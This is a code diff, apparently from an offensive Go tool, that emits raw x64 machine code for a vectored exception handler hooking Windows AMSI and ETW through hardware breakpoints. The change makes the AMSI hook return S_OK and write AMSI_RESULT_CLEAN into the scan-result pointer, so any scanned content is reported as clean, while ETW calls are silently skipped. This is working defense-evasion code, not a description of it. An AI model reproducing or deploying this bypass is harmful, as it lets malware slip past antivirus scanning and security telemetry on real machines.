@@ -136,7 +136,7 @@ var (
 // Handler logic (x64 Windows ABI, RCX = EXCEPTION_POINTERS*):
 //  1. Check ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP (0x80000004)
 //  2. Load ContextRecord pointer
-//  3. Compare ContextRecord->Rip against AMSI addr → set Rax = 0x80070057
+//  3. Compare ContextRecord->Rip against AMSI addr → set Rax = 0 (S_OK), write AMSI_RESULT_CLEAN to output ptr
 //  4. Compare ContextRecord->Rip against ETW addr  → set Rax = 0
 //  5. Simulate RET: pop [Rsp] into Rip, Rsp += 8
 //  6. Clear Dr6
@@ -225,11 +225,21 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	jneSkipAmsiOffset := len(code)
 	code = append(code, 0x00) // placeholder
 
-	// AMSI match: set Rax in context to E_INVALIDARG (0x80070057)
-	// Use mov eax, imm32 (zero-extends to 64-bit) then store to context
-	code = append(code, 0xB8, 0x57, 0x00, 0x07, 0x80) // mov eax, 0x80070057
-	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
+	// AMSI match: bypass by returning S_OK (0) with AMSI_RESULT_CLEAN (0).
+	// AmsiScanBuffer has 6 parameters — the 6th (AMSI_RESULT *result) is an
+	// output pointer at [Rsp+0x30] in the x64 calling convention. We must write
+	// AMSI_RESULT_CLEAN to it, otherwise the caller reads uninitialized memory.
+	// Set Rax in context to S_OK (0)
+	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+disp32], imm32
 	code = append(code, 0x78, 0x00, 0x00, 0x00)       // disp32 = 0x78 (Rax offset)
+	code = append(code, 0x00, 0x00, 0x00, 0x00)       // imm32 = 0 (S_OK)
+	// Read Rsp from context to access caller's stack
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
+	code = append(code, 0x98, 0x00, 0x00, 0x00)       // disp32 = 0x98 (Rsp offset)
+	// Load 6th parameter (AMSI_RESULT*) from [Rsp+0x30]
+	code = append(code, 0x48, 0x8B, 0x40, 0x30)       // mov rax, [rax+0x30]
+	// Write AMSI_RESULT_CLEAN (0) to the output parameter
+	code = append(code, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00) // mov dword [rax], 0
 
 	// jmp do_ret
 	code = append(code, 0xEB) // jmp rel8
